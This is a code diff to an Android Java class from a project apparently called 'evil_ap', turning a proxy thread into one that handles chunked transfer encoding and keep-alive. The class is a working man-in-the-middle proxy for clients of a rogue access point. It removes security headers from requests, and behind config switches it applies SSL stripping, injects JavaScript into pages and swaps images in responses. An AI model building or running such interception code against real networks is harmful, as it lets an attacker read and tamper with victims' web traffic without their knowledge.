@@ -8,7 +8,6 @@ import com.nibiru.evil_ap.SharedClass;
 import com.nibiru.evil_ap.log.Client;
 
 import java.io.BufferedReader;
-import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
@@ -22,10 +21,10 @@ import okhttp3.Request;
 import okhttp3.Response;
 
 /**
- * Created by Nibiru on 2016-11-25.
+ * Created by Nibiru on 2016-12-23.
  */
 
-public class ThreadProxy implements Runnable{
+public class ThreadChunkedTE implements Runnable {
     /**************************************CLASS FIELDS********************************************/
     protected final String TAG = getClass().getSimpleName();
     private Socket sClient;
@@ -35,8 +34,9 @@ public class ThreadProxy implements Runnable{
     private SharedPreferences mConfig;
     private SharedClass mSharedObj;
     private boolean debug = true;
+    private boolean keep_alive;
     /**************************************CLASS METHODS*******************************************/
-    ThreadProxy(Socket sClient, SharedPreferences config, SharedClass sharedObj) {
+    ThreadChunkedTE(Socket sClient, SharedPreferences config, SharedClass sharedObj) {
         this.sClient = sClient;
         rp = new OkHttpParser();
         //make client not follow redirects!
@@ -45,6 +45,7 @@ public class ThreadProxy implements Runnable{
         mConfig = config;
         mSharedObj = sharedObj;
         c = mSharedObj.getClientByIp(sClient.getInetAddress().toString().substring(1));
+        keep_alive = true;
     }
     @Override
     public void run() {
@@ -52,82 +53,84 @@ public class ThreadProxy implements Runnable{
         BufferedReader inFromClient = null;
         OutputStream outToClient = null;
         Response res = null;
-        try {
-            inFromClient = new BufferedReader(new InputStreamReader(sClient.getInputStream()));
-            outToClient = sClient.getOutputStream();
+        while (keep_alive) {
+            res = null;
+            try {
+                inFromClient = new BufferedReader(new InputStreamReader(sClient.getInputStream()));
+                outToClient = sClient.getOutputStream();
 
-            //get client request string
-            String sRequest = getRequestString(inFromClient);
-            if (sRequest == null) {return;}
-
-            //parse string request into okhttp request (remove some security headers)
-            Request req = rp.parse(sRequest, mSharedObj, c);
-            if (req == null) {return;}
-
-            //make request and get response
-            res = okhttp.newCall(req).execute();
-
-            //prepare response
-            byte[] bytesBody = res.body().bytes();
-            //prepare proper length for Content-Length response header
-            //but first check if we are sending back image and swapping it
-            String contentType = res.header("Content-Type");
-            boolean imgSwapFlag = contentType != null && contentType.contains("image")
-                    && mConfig.getBoolean(ConfigTags.imgReplace.toString(), false);
-            int bodyLen;
-            if (imgSwapFlag) {
-                bodyLen = mSharedObj.getImgDataLength();
-            }
-            else {
-                bodyLen = bytesBody.length;
-            }
-            //prepare response headers
-            String headers = getResponseHeaders(res, bodyLen, getEtag(sRequest));
-            // In order to comply with protocol
-            headers = headers.replaceAll("\\n", "\r\n");
-
-            //SEND RESPONSE TO CLIENT, first header then body
-            sendChunk(headers.getBytes(), outToClient);
-            //if we are sending back image and imgReplace is on then swap img body
-            if (imgSwapFlag){
-                sendChunk(mSharedObj.getImgData(), outToClient);
-            }
-            else { //else we are not swapping image or we are not sending image
-                //EDIT RESPONSE HERE (if it is text)
-                if (contentType != null && contentType.contains("text")) {
-                    boolean sslStrip = mConfig.getBoolean(ConfigTags.sslStrip.toString(), false);
-                    boolean jsInject = mConfig.getBoolean(ConfigTags.jsInject.toString(), false);
-                    if (sslStrip || jsInject) {
-                        bytesBody = editBytes(bytesBody, sslStrip, jsInject);
-                    }
+                //get client request string
+                String sRequest = getRequestString(inFromClient);
+                if (sRequest == null) {
+                    return;
                 }
-                sendChunk(bytesBody, outToClient);
-            }
 
-            if (debug) Log.d(TAG + "[OUT]", headers);
-            outToClient.flush();
+                //check if we are in keep alive connection
+                keep_alive = sRequest.contains("keep-alive");
+
+                //parse string request into okhttp request (remove some security headers)
+                Request req = rp.parse(sRequest, mSharedObj, c);
+                if (req == null) {
+                    return;
+                }
+
+                //make request and get response
+                res = okhttp.newCall(req).execute();
+
+                //check what we are sending back
+                String contentType = res.header("Content-Type");
+                //prepare response
+                byte[] bytesBody = res.body().bytes();
+
+                //EDIT RESPONSE HERE
+                boolean sslStrip = mConfig.getBoolean(ConfigTags.sslStrip.toString(), false);
+                boolean jsInject = mConfig.getBoolean(ConfigTags.jsInject.toString(), false);
+                if (sslStrip || jsInject)
+                    bytesBody = editBytes(bytesBody, sslStrip, jsInject);
+                //prepare response headers
+                String headers = getResponseHeaders(res, getEtag(sRequest));
+                headers = headers.replaceAll("\\n", "\r\n");
+                sendHeaders(headers, outToClient);
+
+                //if we are sending back image and imgReplace is on then swap img bytes
+                if (contentType != null && contentType.contains("image")
+                        && mConfig.getBoolean(ConfigTags.imgReplace.toString(), false)) {
+                    sendImgChunks(outToClient);
+                } else {
+                    sendChunkToOutStream(bytesBody, outToClient);
+                }
+                //send end chunk
+                sendChunkToOutStream("".getBytes(),outToClient);
+                //debug headers
+                if (debug) Log.d(TAG + "[OUT]", headers);
+
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+        }
+
+        //clean up when we are done
+        if (res != null) res.body().close();
+        try {
+            if (outToClient != null) outToClient.close();
+            if (sClient != null) sClient.close();
         } catch (IOException e) {
             e.printStackTrace();
-        } finally {
-            //clean up
-            if (res != null) res.body().close();
-             try {
-                 if (outToClient != null) outToClient.close();
-                 if (sClient != null) sClient.close();
-             }
-             catch (IOException e) {
-                 e.printStackTrace();
-             }
         }
     }
 
-    private void sendChunk(byte[] msg, OutputStream out){
-        try {
-            out.write(msg, 0, msg.length);
-        } catch (IOException e) {
-            e.printStackTrace();
+    private void sendImgChunks(OutputStream out) {
+        /*byte[] reply;
+        int byte_idx = 0;
+        int len = mSharedObj.getImgDataLength();
+        while (byte_idx <= len){
+            reply = mSharedObj.getImgChunk(byte_idx, byte_idx+8192);
+            sendChunkToOutStream(reply, out);
+            byte_idx += 8192;
         }
-        if (debug) Log.d(TAG + "[OUT]", "sent chunk!");
+        if (debug) Log.d(TAG + "[OUT]", "sent img body!");*/
+        byte[] img = mSharedObj.getImgData();
+        sendChunkToOutStream(img, out);
     }
 
     private byte[] editBytes(byte[] bytesBody, Boolean sslStrip, Boolean jsInject) {
@@ -151,6 +154,65 @@ public class ThreadProxy implements Runnable{
         }
     }
 
+    // convert InputStream to String
+    private static String getStringFromInputStream(InputStream is) {
+
+        BufferedReader br = null;
+        StringBuilder sb = new StringBuilder();
+
+        String line;
+        try {
+
+            br = new BufferedReader(new InputStreamReader(is));
+            while ((line = br.readLine()) != null) {
+                sb.append(line);
+            }
+
+        } catch (IOException e) {
+            e.printStackTrace();
+        } finally {
+            if (br != null) {
+                try {
+                    br.close();
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
+            }
+        }
+
+        return sb.toString();
+
+    }
+
+    private void sendChunkToOutStream(byte[] msg, OutputStream out){
+        String chunk = Integer.toHexString(msg.length);
+        byte[] delim = "\r\n".getBytes();
+        byte[] chunkArr = new byte[chunk.length()+2+msg.length+2];
+        // create chunk byte array
+        System.arraycopy(chunk.getBytes(), 0, chunkArr, 0, chunk.length()); //hex len
+        System.arraycopy(delim, 0, chunkArr, chunk.length(), delim.length); // /r/n
+        System.arraycopy(msg, 0, chunkArr, chunk.length()+delim.length, msg.length); // msg
+        System.arraycopy(delim, 0, chunkArr, chunk.length()+delim.length+msg.length, delim.length);
+        try {
+            out.write(chunkArr, 0, chunkArr.length);
+            out.flush();
+        } catch (IOException e) {
+            e.printStackTrace();
+            keep_alive = false;
+        }
+        if (debug) Log.d(TAG + "[OUT]", "sent chunk!");
+    }
+
+    private void sendHeaders(String msg, OutputStream out){
+        try {
+            out.write(msg.getBytes(), 0, msg.length());
+            out.flush();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+        if (debug) Log.d(TAG + "[OUT]", "sent headers!");
+    }
+
     private String getEtag(String sRequest){
         String result = "";
         if (sRequest.contains("\"")) {
@@ -160,7 +222,7 @@ public class ThreadProxy implements Runnable{
         return "\"" + result + "\"";
     }
 
-    private String getResponseHeaders(Response res, int len, String eTag) throws IOException {
+    private String getResponseHeaders(Response res, String eTag) throws IOException {
         String resToClient = "";
         if (debug) Log.d(TAG, "<==================Sending response==================>");
         //find status line
@@ -177,15 +239,12 @@ public class ThreadProxy implements Runnable{
         }
         //send headers
         resToClient += res.headers().toString() + "\n";
-        //workaround for okhttp transparent gzip
-        resToClient = resToClient.replace("Transfer-Encoding: chunked", "Content-Length: " + len);
+
         //workaround for 304's not working
         if (resToClient.startsWith("HTTP/1.1 304")) {
+            resToClient = resToClient.replace("Connection: keep-alive", "Connection: close");
             resToClient = resToClient.replaceAll("ETag:.*", "ETag: " + eTag);
         }
-        //TODO: test preformance
-        //resToClient = resToClient.replaceAll("(?i)Connection: keep-alive", "Connection: close");
-        //resToClient = resToClient.replaceAll("(?i)\\nKeep-Alive.*", "");
         return resToClient;
     }
 
@@ -229,57 +288,6 @@ public class ThreadProxy implements Runnable{
         }
         request += body; // adding the body to request
         return request;
-    }
-
-    /*************************************OLD METHODS**********************************************/
-    private ByteArrayOutputStream swapImg(String headers, ByteArrayOutputStream streamResponse)
-            throws IOException {
-        //add header bytes to stream
-        streamResponse.write(headers.getBytes());
-        //add swapped image bytes to stream
-        streamResponse.write(mSharedObj.getImgData());
-        return streamResponse;
-    }
-    private static String getStringFromInputStream(InputStream is) {
-
-        BufferedReader br = null;
-        StringBuilder sb = new StringBuilder();
-
-        String line;
-        try {
-
-            br = new BufferedReader(new InputStreamReader(is));
-            while ((line = br.readLine()) != null) {
-                sb.append(line);
-            }
-
-        } catch (IOException e) {
-            e.printStackTrace();
-        } finally {
-            if (br != null) {
-                try {
-                    br.close();
-                } catch (IOException e) {
-                    e.printStackTrace();
-                }
-            }
-        }
-
-        return sb.toString();
-
-    }
-    private void sendInStreamToOutStream(InputStream in, OutputStream out){
-        byte[] reply = new byte[4096];
-        int bytes_read;
-        try {
-            while ((bytes_read = in.read(reply)) != -1) {
-                out.write(reply, 0, bytes_read);
-                out.flush();
-            }
-            if (debug) Log.d(TAG + "[OUT]", "sent entire body!");
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
     }
 
 }
